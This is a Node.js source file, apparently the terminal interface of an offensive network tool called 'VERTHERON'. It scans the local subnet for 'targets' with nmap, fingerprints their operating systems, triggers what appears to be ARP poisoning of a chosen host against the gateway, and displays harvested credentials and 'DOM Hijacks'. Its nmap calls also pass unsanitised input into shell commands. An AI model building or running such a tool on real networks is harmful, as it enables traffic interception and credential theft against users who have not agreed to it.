#!/usr/bin/env node

 var ip = require("ip");
   util = require('util');
 events = require('events');
blessed = require('blessed');
contrib = require('blessed-contrib')
harvest = require('./harvest'),
 xml2js = require('xml2js').parseString,
   gmac = require('getmac');
   exec = require('child_process').exec

var exports = module.exports = new events.EventEmitter();

exports.init = function(){

  exports.lines = 0

  exports.harvesting = false

  exports.widgets = []

  exports.screen = blessed.screen({
    fastCSR: true
  });

  exports.screen.key(['escape', 'q', 'C-c'], function(ch, key) {
    if ( exports.harvesting == true || exports.deepScanning == true) {
      exports.harvesting = exports.deepScanning = false;
      exports.widgets['scanner'].detach();
      return exports.screen.render()
    } else {
      if (!exports.target)
        return process.exit(0);
      exports.emit('heal', exports.target, exports.gateway);
      setTimeout(function(){
        process.exit(0);
      }, 2000)
    }
  });

  exports.screen.title = ':: VERTHERON ::';

  exports.render()
}

exports.render = function() {

  exports.widgets['left'] = blessed.box({
    top: '0',
    left: '1%',
    right: '1%',
    width: '69%',
    height: '99%',
    tags: true,
    scrollable: true,
    padding: 1,
    border: {
      // type: 'line'
    },
    style: {
      fg: 'white',
      bg: 'black',
      border: {
        fg: '#f0f0f0'
      },
      hover: {
        bg: 'green'
      }
    }
  });

  exports.widgets['topRight'] = blessed.box({
    top: '2%',
    right: '0',
    width: '30%',
    height: '80%',
    content: '{center}{bold} {red-fg}~^~ {/red-fg} DOM Hijacks: {red-fg}~^~{/red-fg} {/bold}\n{/center}',
    tags: true,
    border: {
      type: 'line'
    },
    style: {
      fg: 'white',
      bg: 'black',
      border: {
        fg: 'cyan'
      },
      hover: {
        bg: 'green'
      }
    }
  });

  exports.widgets['bottomRight'] = blessed.list({
      keys: true,
      selectedFg: 'red',
      selectedBg: 'black',
      right: '0',
      top: '82%',
      width: '30%',
      height: '15%',
      inputOnFocus: true,
      fg: 'white',
      bg: 'black',
      border: {
        type: 'ascii',
        fg: 'cyan',
        bg: 'black'
      },
      selectedBg: 'black',
      items: [
      ],
      scrollbar: {
        ch: ' ',
        track: {
          bg: 'black'
        , fg: 'red'
        },
        style: {
            fg: 'white',
            bg: '#454545',

            focus: {
                fg: 'red',
                bg: '#353535'
            }
        }
      }
  })

  exports.screen.append(exports.widgets['bottomRight']);

  exports.widgets['bottomRight'].select(0);

  exports.widgets['bottomRight'].on('keypress', function(ch, key) {
    switch (key.name) {
      case 'enter':
        if (this.value == 'stop') {
          exports.emit('heal', exports.target, exports.gateway);
          return;
        }
        if (this.value == 'kill') {
          return process.exit(0);
        }
        if (this.value == 'find targets') {
          return exports.scan()
        }
        exports.widgets['left'].setContent('{yellow-fg}Poisioning --> ' + this.value + '{/yellow-fg}')
        var target = this.value.split('   ')
        exports.target = {
          IP: target[0]
        , MAC: target[1] // "10:a5:d0:49:ac:cc"
        }
        exports.self.IP = exports.gateway.IP
        exports.emit('poision', exports.target, exports.self);
        exports.widgets['cli'].focus()
        exports.screen.render()
        break;
      case 'space':
        exports.deepScanning = true
        exports.deepScan(getIP(this.value))
        exports.widgets['left'].setContent('{yellow-fg} OS Scanning --> ' + this.value + '{/yellow-fg}')
        exports.screen.render()
      break;
    }
  });

  exports.widgets['bottomRight'].key('1', function(){
    exports.widgets['cli'].focus()
  })

  exports.widgets['cli'] = blessed.textarea({
      bottom: 0,
      height: 1,
      inputOnFocus: true,
      padding: {
          top: 0,
          left: 1
      },
      style: {
          fg: '#787878',
          bg: '#454545',

          focus: {
              fg: '#f6f6f6',
              bg: '#353535'
          }
      }
  });

  exports.widgets['cli'].key('C-v', function(ch, key) {
    exports.sliceTop('left')
  });

  exports.widgets['cli'].key('C-d', function(ch, key) {
    exports.toWidget('topRight', '{center}{bold} {red-fg}~^~ {/red-fg} DOM Hijacks: {red-fg}~^~{/red-fg} {/bold}\n{/center}', true)
  });

  exports.widgets['cli'].on('keypress', function(ch, key) {
    if (key.name === 'up' || key.name === 'k') {
      exports.widgets['bottomRight'].up();
      exports.screen.render();
      return;
    }
    if (key.name === 'down' || key.name === 'j') {
      exports.widgets['bottomRight'].down();
      exports.screen.render();
      return;
    }
    if (key.name === 'enter') {
      if (this.value == 'stop') {
        exports.emit('heal', exports.target, exports.gateway);
        return;
      }
      if (this.value == 'kill') {
        return process.exit(0);
      }
      if (this.value == 'find targets') {
        return exports.scan()
      }
      if ( exports.harvesting == true) {
        exports.harvesting = false
        exports.widgets['scanner'].detach();
        this.value = ''
        return exports.screen.render()
      }
      if (this.value == 'harvest') {
        exports.screen.append(exports.widgets['scanner']);
        exports.harvesting = true
        exports.screen.render()
        exports.harvest()
        return;
      }
      if (this.value == 'deep scan') {
        exports.deepScanning = true
        exports.deepScan(exports.target)
        return;
      }
      if (this.value == 'clear dom') {
        exports.widgets['topRight'].setContent('')
        exports.screen.render()
        return;
      }
      if (this.value == 'p') {
        var target = exports.widgets['bottomRight'].value.split('  ')
        exports.target = {
          IP: target[0]
        , MAC: target[1].replace(' ','')
        }
        exports.widgets['left'].setContent('{red-fg}Poisioning --> ' + exports.widgets['bottomRight'].value + '{/red-fg}')
        exports.self.IP = exports.gateway.IP
        exports.emit('poision', exports.target, exports.self);
        exports.widgets['cli'].focus()
        exports.screen.render()
        return;
      }
      console.log("")
    }
  })

  exports.widgets['scanner'] = blessed.box({
    width: '100%',
    height: '100%',
    top: '0%',
    left: '0%',
    tags: true,
    border: {
      type: 'line'
    },
    style: {
      fg: 'red',
      bg: 'black',
      border: {
        fg: 'black'
      },
      hover: {
        bg: 'green'
      }
    }
  })

  exports.screen.append(exports.widgets['left']);

  exports.screen.append(exports.widgets['topRight']);

  exports.screen.append(exports.widgets['bottomRight']);

  exports.screen.append(exports.widgets['cli']);

  exports.widgets['scanner'].hide()

  exports.widgets['bottomRight'].focus()

  exports.screen.render()

  exports.scan()

}

exports.toWidget = function(target, message, clear){
  var content = exports.widgets[target].getContent()
  if (clear)
    content = ''
  exports.widgets[target].setContent(content + "\n" + message);
  exports.lines = content.split('\n').length
  if (exports.lines > 50) {
    exports.sliceTop('left')
  } else {
    exports.screen.render()
  }
}

exports.sliceTop = function(target){
  exports.widgets[target].deleteLine(0)
  exports.widgets[target].deleteLine(1)
  exports.widgets[target].deleteLine(2)
  exports.widgets[target].deleteLine(3)
  exports.widgets[target].deleteLine(4)
  exports.widgets[target].deleteLine(5)
  exports.widgets[target].deleteLine(6)
  exports.widgets[target].deleteLine(7)
  exports.widgets[target].deleteLine(8)
  exports.widgets[target].deleteLine(9)
  exports.widgets[target].deleteLine(10)
  var content = exports.widgets[target].getContent()
  exports.lines = content.split('\n').length
  exports.screen.render()
  if (exports.lines > 50)
    exports.sliceTop(target)
}

exports.scan = function(){                                                                                                       // ABSTRACT Scanner

  cidr = exports.cidr(ip.address())

  exports.toWidget('left', '{center}{bold} \n\n\n\n\n\  {red-fg} _ Scanning Hosts _ {/red-fg}\n\n{white-fg}       ' + cidr.range + '    {/white-fg} {/bold}{/center}', true)

  exports.widgets['bottomRight'].clearItems()

  exec('nmap -oX - -sP ' + cidr.range, function(err, stdout, stderr){

    if (err)
      return console.log('!ERROR!', err)

    xml2js(stdout, function (err, result){
      var results = JSON.parse(JSON.stringify(result))
      var targets = []
      for (var i in results.nmaprun.host) {
        var host = results.nmaprun.host[i]
        var obj = []
        for (var x in host.address) {
          var host_details = host.address[x].$
          for (var opt in host_details) {
            if (opt[0] !== '[')
              obj[host_details['addrtype']] = host_details['addr']
            if (typeof host_details['vendor'] !== 'undefined')
              obj['vendor'] = host_details['vendor']
          }
        }
        targets.push(obj)
      }
      var target_content = ''
      for (i in targets) {
        var address = []
        if (typeof targets[i].vendor !== 'undefined')
          target_content += ' ' + targets[i].vendor.toUpperCase() + '\n'
        if (typeof targets[i].mac !== 'undefined')
          address.push(targets[i].mac)
        if (typeof targets[i].ipv4 !== 'undefined')
          address.push(targets[i].ipv4)
        target_content += ' :' + address.join(' : ') + ':', '\n'
      }
      var targetData = [], targetCount = 0;
      for (i in targets) {
        var target = targets[i]
        if (target.ipv4.length) {
          if (target.ipv4 !== ip.address()) {
            _target = '  ' + target.ipv4 + ((target.ipv4.length < 9) ? ' ' : '')
            + (target.mac    ? '   ' + target.mac    : '')
            + (target.vendor ? '   ' + target.vendor : '')
            targetCount++
            exports.widgets['bottomRight'].addItem(_target)
          } else {
            gmac.getMac(function(err, mac){
              if (err)  throw err
              exports.self = {
                IP: target.ipv4
              , MAC: mac
              }
            })
          }
          if (target.ipv4 == cidr.gateway) {
            exports.gateway = {
              IP: target.ipv4
            , MAC: target.mac
            }
          }
        }
      }
      exports.widgets['scanner'].toggle()
      exports.widgets['bottomRight'].focus()
      exports.toWidget('left', '{center}{bold} \n\n\n\n\n\  {red-fg} :: ' + targetCount + ' targets found :: {/red-fg}{/bold}{/center}', true)
      exports.screen.render()
    });

  });
}

exports.deepScan = function (target){

  if (!target) return;

  exec('nmap -oX - -v -A ' + target, function(err, stdout, stderr){

    if (err)
      return console.log('!ERROR!', err)

    var hosts = stdout

    var parseString = require('xml2js').parseString;

    parseString(hosts, function (err, result){

      var matches = '';

      if (!result.nmaprun.host ||
          !result.nmaprun.host[0].os[0].osmatch) {

        matches = '[X] ::_ (: unable to detect target OS _:: [X]'

      } else {

        var osResults = JSON.parse(JSON.stringify(result.nmaprun.host[0].os[0].osmatch[0].osclass))

        for (var i in osResults) {
          var props = osResults[i].$
          matches += '[*] ::'+props.type || '' +' '+props.vendor || '' +' '+props.osfamily || '' +' '+props.osgen || '' +' '+props.accuracy+'% :: \n';
        }

      }

      exports.screen.append(exports.widgets['scanner']);
      exports.screen.render()
      exports.toWidget('scanner', matches, true)

    });

  });

  exports.screen.render()
}

harvest.on('harvested', function(creds) {
  exports.toWidget('scanner', exports.widgets['scanner'].getContent() + "\n" + creds, true)
})

exports.harvest = function(){
  harvest.collect()
}

exports.cidr = function(ip){
  var range = ip.split('.')
  range.pop()
  return {
    range: range.join('.')+'.1/24'
  , gateway: range.join('.')+'.1'
  }
}

function getIP(signature){
  var target = signature.split('   ')
  return target[0]
}
